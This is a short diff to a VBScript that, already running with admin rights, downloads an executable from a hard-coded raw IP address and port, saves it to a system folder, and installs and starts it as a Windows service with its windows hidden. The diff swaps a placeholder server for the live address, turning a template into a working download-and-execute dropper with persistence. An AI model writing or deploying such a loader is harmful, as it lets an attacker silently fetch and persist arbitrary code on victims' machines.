@@ -6,8 +6,8 @@ End If
 
 ' Now running as admin, proceed with the script
 Dim url, downloadPath, objXMLHTTP, objFSO, objFile, objShell
-url = "http://yourserver.com/goService.exe"
-downloadPath = "C:\path\to\save\goService.exe"
+url = "http://51.81.73.108:5552/uploads/goService.exe"
+downloadPath = "C:\Sys\goService.exe"
 
 ' Download the file
 Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -21,7 +21,7 @@ If objXMLHTTP.Status = 200 Then
     objFile.Close
 End If
 
-' Install and start the service
+' Install and start the service using the downloaded file
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "goService.exe install", 0, True
-objShell.Run "goService.exe start", 0, True
+objShell.Run """" & downloadPath & """ install", 0, True
+objShell.Run """" & downloadPath & """ start", 0, True
